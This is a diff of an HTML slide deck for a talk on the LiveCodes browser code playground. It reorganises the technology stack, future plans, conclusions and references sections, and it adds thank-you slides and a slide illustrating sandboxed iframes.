+            &lt;p&gt;&lt;code class="inline"&gt;allow-modals&lt;/code&gt;&lt;/p&gt;
+          &lt;/div&gt;
+        </textarea>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Security: [Code] Sandboxed Iframes" data-markdown="">
+        <textarea data-template="">          ## Sandboxed Iframes
+          ```html[]
+          &lt;iframe
+            sandbox="allow-scripts allow-popups allow-forms allow-same-origin"
+            src="https://unique-origin.com/untrusted.html" 
+          &gt;&lt;/iframe&gt;
+          ```
+            &lt;p&gt;Unique Origin&lt;/p&gt;
+            &lt;p class="fragment"&gt;&lt;code class="inline"&gt;postMessage&lt;/code&gt;&lt;/p&gt;
+        </textarea>
+      </section>
     </section>
 
-    <section data-visibility="!hidden" data-title="Technology Stack" class="align-left">
-      <h2>Technology Stack</h2>
-      <p class="fragment">(a.k.a. Personal Preferences!)</p>
-      <ul>
-        <li class="fragment">"Vanilla" TypeScript</li>
-        <li class="fragment">NEVER use classes or <code class="inline">this</code>!</li>
-        <li class="fragment">Build system: Esbuild</li>
-        <li class="fragment">Testing: Playwright &amp; Jest</li>
-        <li class="fragment">Docs: Docusaurus</li>
-        <li class="fragment">CI/CD: GitHub Actions</li>
-        <li class="fragment">Hosting: Cloudflare Pages</li>
-        <li class="fragment">Backend: None :)</li>
-      </ul>
-    </section>
+    <section data-visibility="!hidden" data-title="Conclusions">
+      <section data-visibility="!hidden" data-title="Technology Stack" class="align-left">
+        <h2>Technology Stack</h2>
+        <p class="fragment">(a.k.a. Personal Preferences!)</p>
+        <ul>
+          <li class="fragment">"Vanilla" TypeScript</li>
+          <li class="fragment">NEVER use classes or <code class="inline">this</code>!</li>
+          <li class="fragment">Build system: Esbuild</li>
+          <li class="fragment">Testing: Playwright &amp; Jest</li>
+          <li class="fragment">Docs: Docusaurus</li>
+          <li class="fragment">CI/CD: GitHub Actions</li>
+          <li class="fragment">Hosting: Cloudflare Pages</li>
+          <li class="fragment">Backend: None :)</li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Future" class="align-left">
-      <h2>Future</h2>
-      <ul>
-        <li class="fragment">Offline!</li>
-        <li class="fragment">Source control</li>
-      </ul>
-    </section>
+      <section data-visibility="!hidden" data-title="Future" class="align-left">
+        <h2>Future</h2>
+        <ul>
+          <li class="fragment">Offline!
+            <ul>
+              <li class="fragment">Service workers</li>
+            </ul>
+          </li>
+          <li class="fragment">Source control
+            <ul>
+              <li class="fragment">Client-side Git!</li>
+            </ul>
+          </li>
+          <li class="fragment">Collaboration
+            <ul>
+              <li class="fragment">WebRTC</li>
+            </ul>
+          </li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="Conclusions" class="align-left">
-      <h2>Conclusions</h2>
-      <ul>
-        <li class="fragment">Open-Source = ❤️</li>
-        <li class="fragment">Keep learning and building</li>
-      </ul>
-    </section>
+      <section data-visibility="!hidden" data-title="Conclusions" class="align-left">
+        <h2>Conclusions</h2>
+        <ul>
+          <li class="fragment">Open-Source = ❤️</li>
+          <li class="fragment">Keep learning and building</li>
+        </ul>
+      </section>
 
-    <section data-visibility="!hidden" data-title="References" class="align-left">
-      <h2>References</h2>
-      <ul class="small">
-        <li>https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap</li>
-        <li>https://github.com/WICG/import-maps</li>
-        <li>https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers</li>
-        <li>https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs</li>
-        <li>https://web.dev/sandboxed-iframes/</li>
-      </ul>
+      <section data-visibility="!hidden" data-title="References" class="align-left">
+        <h2>References</h2>
+        <ul class="small">
+          <li>https://webassembly.org/</li>
+          <li>https://developer.mozilla.org/en-US/docs/Web/HTML/Element/script/type/importmap</li>
+          <li>https://github.com/WICG/import-maps</li>
+          <li>https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Using_web_workers</li>
+          <li>https://developer.mozilla.org/en-US/docs/Web/API/Web_Workers_API/Structured_clone_algorithm</li>
+          <li>https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/Data_URLs</li>
+          <li>https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage</li>
+          <li>https://web.dev/sandboxed-iframes/</li>
+        </ul>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Thank you" data-background-image="https://hatemhosny.github.io/livecodes-assets/assets/169594425441340729697594/flowers-livecodes.jpg" data-background-opacity="0.2">
+        <h2>Thank You</h2>
+      </section>
+
+      <section data-visibility="!hidden" data-title="Thank you" data-background-image="https://hatemhosny.github.io/livecodes-assets/assets/169594456454379670896157/flowers-livecodes2.jpg" data-background-opacity="0.2">
+        <h2>Thank You</h2>
+        <div class="align-middle">
+          <p><a href="https://livecodes.io" target="_blank">https://livecodes.io</a></p>
+          <p><a href="https://livecodes.io/docs" target="_blank">https://livecodes.io/docs</a></p>
+          <p><a href="https://github.com/live-codes/livecodes" target="_blank">https://github.com/live-codes/livecodes</a></p>
+          <p><a href="https://twitter.com/livecodes_io" target="_blank">https://twitter.com/livecodes_io</a></p>
+          <p class="edit-slides align-left small">slides: <a href="https://livecodes.io/?x=id/asefjzvfu8j" target="_blank">https://livecodes.io</a></p>
+        </div>
+      </section>
     </section>
 
   </div>
